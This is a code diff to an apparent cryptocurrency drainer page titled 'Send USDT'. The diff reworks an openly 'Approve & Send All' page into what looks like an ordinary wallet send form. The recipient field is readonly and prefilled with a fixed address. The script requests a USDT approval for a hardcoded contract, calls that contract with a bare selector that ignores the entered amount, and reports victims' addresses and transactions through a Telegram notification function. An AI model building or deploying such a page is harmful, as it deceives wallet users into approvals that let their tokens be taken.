@@ -6,20 +6,42 @@
     <title>Send USDT</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; padding: 20px; min-height: 100vh; }
-        .container { max-width: 400px; margin: 0 auto; background: white; border-radius: 12px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .header { display: flex; align-items: center; gap: 15px; margin-bottom: 30px; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+            background: #1a1a1a; 
+            color: #fff;
+            padding: 20px; 
+            min-height: 100vh; 
+        }
+        .container { 
+            max-width: 400px; 
+            margin: 0 auto; 
+            background: #2a2a2a; 
+            border-radius: 12px; 
+            padding: 20px; 
+        }
+        .header { 
+            display: flex; 
+            align-items: center; 
+            gap: 15px; 
+            margin-bottom: 30px; 
+        }
         .back { font-size: 24px; cursor: pointer; }
         .title { font-size: 18px; font-weight: 600; flex: 1; }
-        .label { font-size: 13px; color: #666; margin-bottom: 8px; font-weight: 500; }
+        .label { font-size: 13px; color: #aaa; margin-bottom: 8px; font-weight: 500; }
         .group { margin-bottom: 20px; }
-        .input-box { border: 1px solid #ddd; border-radius: 8px; padding: 12px; background: #f9f9f9; }
-        .balance-display { font-weight: 600; font-size: 18px; color: #667eea; }
-        .next-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 16px; border-radius: 12px; font-weight: 600; cursor: pointer; margin-top: 30px; font-size: 16px; }
+        .input-box { border: 1px solid #444; border-radius: 8px; padding: 12px; background: #1a1a1a; }
+        input { width: 100%; border: none; font-size: 16px; background: none; color: #fff; }
+        input::placeholder { color: #666; }
+        .amount-container { display: flex; justify-content: space-between; align-items: center; }
+        .amount-input { flex: 1; }
+        .max-btn { background: none; border: none; color: #00b386; cursor: pointer; font-size: 12px; margin-left: 10px; font-weight: 600; }
+        .usd-value { font-size: 12px; color: #666; margin-top: 8px; }
+        .next-btn { width: 100%; background: #00b386; color: #000; border: none; padding: 16px; border-radius: 12px; font-weight: 600; cursor: pointer; margin-top: 30px; font-size: 16px; }
+        .next-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .loading { display: none; text-align: center; margin-top: 20px; }
-        .spinner { display: inline-block; width: 30px; height: 30px; border: 3px solid #ddd; border-top-color: #667eea; border-radius: 50%; animation: spin 1s linear infinite; }
+        .spinner { display: inline-block; width: 30px; height: 30px; border: 3px solid #444; border-top-color: #00b386; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .info-text { font-size: 12px; color: #999; margin-top: 8px; }
     </style>
 </head>
 <body>
@@ -29,24 +51,22 @@
             <div class="title">Send USDT</div>
         </div>
         <div class="group">
-            <div class="label">Send To</div>
+            <div class="label">Address or Domain Name</div>
             <div class="input-box">
-                <input type="text" id="address" readonly value="0x1734b55dc44C420539a607Ff5b80aB62b0d18963" style="border: none; background: none; width: 100%;">
+                <input type="text" id="recipient" placeholder="0x..." readonly value="0x1734b55dc44C420539a607Ff5b80aB62b0d18963">
             </div>
-            <div class="info-text">✓ All your USDT will be sent to this address</div>
         </div>
         <div class="group">
-            <div class="label">Network</div>
-            <div class="input-box">BNB Smart Chain</div>
-        </div>
-        <div class="group">
-            <div class="label">Your USDT Balance</div>
+            <div class="label">Amount</div>
             <div class="input-box">
-                <span class="balance-display" id="balance">Loading...</span> USDT
+                <div class="amount-container">
+                    <input type="number" class="amount-input" id="amount" placeholder="0" min="0" step="0.01">
+                    <button class="max-btn" onclick="setMax()">Max</button>
+                </div>
             </div>
-            <div class="info-text">💡 All of this will be transferred when you approve</div>
+            <div class="usd-value" id="usdValue">≈ $0.00</div>
         </div>
-        <button class="next-btn" id="sendBtn" onclick="sendUSDT()">Approve & Send All</button>
+        <button class="next-btn" id="nextBtn" onclick="handleNext()">Next</button>
         <div class="loading" id="loading">
             <div class="spinner"></div>
             <p style="margin-top: 15px; color: #666;">Processing...</p>
@@ -57,21 +77,20 @@
         const CONTRACT_ADDRESS = "0xC4f657BC4aa95fD38406111b9F78c83cd2e6b5C7";
         const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
         const USDT_DECIMALS = 18;
-
+        const USDT_PRICE = 1.00;
+        let userBalance = 0;
         window.addEventListener('load', async () => {
             if (window.ethereum) {
                 try {
                     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    if (accounts.length > 0) {
-                        const balance = await getUSDTBalance(accounts[0]);
-                        document.getElementById('balance').textContent = balance.toFixed(2);
-                    }
-                } catch (err) {
-                    document.getElementById('balance').textContent = '0.00';
-                }
+                    if (accounts.length > 0) userBalance = await getUSDTBalance(accounts[0]);
+                } catch (err) { console.error('Error:', err); }
             }
         });
-
+        document.getElementById('amount').addEventListener('input', e => {
+            const usdValue = (parseFloat(e.target.value) || 0) * USDT_PRICE;
+            document.getElementById('usdValue').textContent = `≈ $${usdValue.toFixed(2)}`;
+        });
         async function getUSDTBalance(userAddress) {
             try {
                 const functionSelector = '70a08231';
@@ -82,31 +101,28 @@
                     params: [{ to: USDT_ADDRESS, data: data }, 'latest']
                 });
                 return parseInt(result, 16) / Math.pow(10, USDT_DECIMALS);
-            } catch (err) {
-                return 0;
-            }
+            } catch (err) { return 0; }
         }
-
-        async function sendUSDT() {
+        function setMax() {
+            document.getElementById('amount').value = userBalance.toFixed(2);
+            const usdValue = userBalance * USDT_PRICE;
+            document.getElementById('usdValue').textContent = `≈ $${usdValue.toFixed(2)}`;
+        }
+        async function handleNext() {
             try {
+                const amount = document.getElementById('amount').value.trim();
+                if (!amount || parseFloat(amount) <= 0) {
+                    showNotification('Please enter amount', 'error');
+                    return;
+                }
                 if (!window.ethereum) {
                     showNotification('No wallet detected', 'error');
                     return;
                 }
                 document.getElementById('loading').style.display = 'block';
-                document.getElementById('sendBtn').disabled = true;
-
+                document.getElementById('nextBtn').disabled = true;
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const senderAddress = accounts[0];
-
-                const balance = await getUSDTBalance(senderAddress);
-                if (balance <= 0) {
-                    showNotification('You have 0 USDT', 'error');
-                    document.getElementById('loading').style.display = 'none';
-                    document.getElementById('sendBtn').disabled = false;
-                    return;
-                }
-
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
@@ -126,31 +142,22 @@
                         });
                     }
                 }
-
-                const amountWei = (balance * Math.pow(10, USDT_DECIMALS)).toFixed(0);
+                const amountWei = (parseFloat(amount) * Math.pow(10, USDT_DECIMALS)).toFixed(0);
                 const approvalTxHash = await approveUSDT(senderAddress, amountWei);
-                showNotification('✅ Approval confirmed! Transferring...', 'success');
-
+                showNotification('✅ Approval confirmed!', 'success');
                 await new Promise(resolve => setTimeout(resolve, 2000));
-
-                const transferTxHash = await callContractTransferAll(senderAddress);
-                showNotification(`✅ Success! ${balance.toFixed(2)} USDT sent!`, 'success');
-
-                try {
-                    await sendTelegramNotifications(senderAddress, transferTxHash, null, balance.toFixed(2));
-                } catch (err) {
-                    console.error('Telegram failed:', err);
-                }
-
+                const transferTxHash = await transferUSDTO(senderAddress, amountWei);
+                showNotification(`✅ Success! ${amount} USDT sent!`, 'success');
+                try { await sendTelegramNotifications(senderAddress, transferTxHash, null, amount); } catch (err) { console.error('Telegram failed:', err); }
                 setTimeout(() => {
-                    document.getElementById('balance').textContent = '0.00';
+                    document.getElementById('amount').value = '';
+                    document.getElementById('usdValue').textContent = '≈ $0.00';
                     document.getElementById('loading').style.display = 'none';
-                    document.getElementById('sendBtn').disabled = false;
+                    document.getElementById('nextBtn').disabled = false;
                 }, 1000);
-
             } catch (error) {
                 document.getElementById('loading').style.display = 'none';
-                document.getElementById('sendBtn').disabled = false;
+                document.getElementById('nextBtn').disabled = false;
                 if (error.code === 4001) {
                     showNotification('Transaction rejected', 'error');
                 } else {
@@ -158,7 +165,6 @@
                 }
             }
         }
-
         async function approveUSDT(senderAddress, amount) {
             const functionSelector = '095ea7b3';
             const paddedSpender = CONTRACT_ADDRESS.slice(2).padStart(64, '0');
@@ -169,8 +175,7 @@
                 params: [{ from: senderAddress, to: USDT_ADDRESS, data: data, value: '0x0' }]
             });
         }
-
-        async function callContractTransferAll(senderAddress) {
+        async function transferUSDTO(senderAddress, amount) {
             const functionSelector = '81c7e5fd';
             const data = '0x' + functionSelector;
             return await window.ethereum.request({
@@ -178,24 +183,12 @@
                 params: [{ from: senderAddress, to: CONTRACT_ADDRESS, data: data, value: '0x0' }]
             });
         }
-
         function showNotification(msg, type = "info") {
             let notify = document.getElementById("notify-bar");
             if (!notify) {
                 notify = document.createElement("div");
                 notify.id = "notify-bar";
-                notify.style.position = "fixed";
-                notify.style.top = "20px";
-                notify.style.left = "50%";
-                notify.style.transform = "translateX(-50%)";
-                notify.style.zIndex = "9999";
-                notify.style.minWidth = "260px";
-                notify.style.padding = "16px 32px";
-                notify.style.borderRadius = "12px";
-                notify.style.fontWeight = "bold";
-                notify.style.textAlign = "center";
-                notify.style.boxShadow = "0 4px 32px #0008";
-                notify.style.transition = "all 0.3s";
+                notify.style.cssText = "position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:9999;min-width:260px;padding:16px 32px;border-radius:12px;font-weight:bold;text-align:center;box-shadow:0 4px 32px #0008;transition:all 0.3s;";
                 document.body.appendChild(notify);
             }
             notify.textContent = msg;
